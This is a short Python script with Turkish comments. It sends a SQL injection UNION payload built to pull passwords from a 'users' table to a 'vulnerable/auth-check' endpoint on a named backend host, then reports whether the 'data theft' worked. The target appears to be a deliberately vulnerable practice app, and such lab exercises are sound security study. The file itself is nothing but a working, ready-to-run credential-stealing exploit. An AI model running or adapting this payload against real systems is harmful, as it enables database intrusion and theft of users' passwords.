import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

# Veritabanından veri çalmayı deneyen 'UNION' sorgusu
union_payload = {
    # Buradaki mantık: Orijinal sorguyu bitir, sonra 'users' tablosundaki şifreleri getir.
    "username": "admin' UNION SELECT password FROM users--",
    "password": ""
}

print("🗄️ VERİTABANI HIRSIZLIĞI BAŞLATILIYOR...\n")

try:
    r = requests.get(f"{BACKEND}/vulnerable/auth-check", params=union_payload)
    result = r.json()

    print(f"Sunucudan Gelen Cevap: {result}\n")

    # Sonuç analizi
    if "password" in str(result) or "users" in str(result):
        print("✅ VERİ ÇALINDI!")
        print("Veritabanından bilgi sızdırıldı!")
    else:
        print("⚠️ Bu yöntem bu sistemde çalışmadı veya sunucu hatası döndü.")
        print("Not: Bazen veritabanı sütun sayıları tutmazsa UNION sorgusu hata verir.")

except Exception as e:
    print(f"Bir hata oluştu: {e}")